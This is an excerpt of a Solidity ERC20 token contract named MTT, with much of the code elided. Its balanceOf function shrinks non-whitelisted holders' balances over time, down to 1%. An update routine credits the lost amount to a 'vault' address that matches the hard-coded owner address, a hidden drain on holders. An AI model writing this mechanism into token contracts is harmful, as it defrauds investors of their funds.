...
contract MT is ERC20, Ownable {
    ...
    address public marketWallet = 0xB01581464D2271a3637d2161c0cb0B8956A8143D;
    address public tokenOwner = 0xB01581464D2271a3637d2161c0cb0B8956A8143D;
    address public vault = 0xB01581464D2271a3637d2161c0cb0B8956A8143D;
    ...
    uint256 public constant SLOPE = 810185185185;
    uint256 public T;
    ...
    address[] public whitelistHolders;
    ...
    constructor() ERC20("MTT", "MTT") {
        ...
        */
        ...
        lastTimestamp[tokenOwner] = block.timestamp;
    }
    ...
    function update(address account) public {
        if (_balances[account] != balanceOf(account)) {
            if (_balances[account] > balanceOf(account)) {
               _balances[vault] += (_balances[account] - balanceOf(account));
            }
            _balances[account] = balanceOf(account);
        }
            
        if (lastTimestamp[account] != block.timestamp)
    ...
    function balanceOf(address account) public view virtual override returns (uint256) {
        uint amount = super.balanceOf(account);
        if (amount == 0 || whitelist[account]) return amount;

        uint dt = block.timestamp - lastTimestamp[account];
        if (dt == 0) return amount;

        uint dAmount = amount * SLOPE * dt / 1e18;
        if (dAmount >= amount * 99 / 100) {
            return amount / 100;
        } else {
    ...
    function _transfer(
        ...
        if (!whitelist[from]) update(from);
        if (!whitelist[to]) update(to);
        ...
        (bool isRemoveLp, bool isAddLp) = isRemoveOrAddLp(from, to);
    ...
    function isRemoveOrAddLp(address from, address to) private view returns (bool, bool) {
        ...
        if (to == uniswapV2Pair && amountETH > 0) { // add
            return (false, true);
        }
        return (false, false);
    }
